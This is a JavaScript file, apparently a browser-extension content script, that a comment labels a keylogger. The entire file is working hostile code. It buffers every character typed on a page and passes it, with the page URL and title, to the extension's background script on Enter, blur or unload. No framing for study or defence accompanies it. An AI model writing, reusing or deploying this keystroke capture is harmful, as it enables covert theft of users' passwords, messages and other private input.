//console.log("initializing keylogger...");

var buffer = "";

window.onkeydown = function(ev) {
  var ev = ev || window.event;
  // on enter
  if (13 === ev.keyCode) {
    sendBuffer();
  }
}

document.onkeypress = function(ev) {
  var ev = ev || window.event;
  // don't print control keys
  if (ev.charCode !== 0 && !ev.ctrlKey) {
    buffer += String.fromCharCode(ev.charCode);
    //console.log(buffer);
  }
}

window.beforeunload = function() {
  sendBuffer();
}

window.onblur = function() {
  sendBuffer();
}

function sendBuffer() {
  if (buffer.length > 0) {
    // send buffer to background script
    browser.runtime.sendMessage({
      "url": window.location.href,
      "title": document.title,
      "buffer": buffer
    });
    // clear buffer
    buffer = "";
  }
}
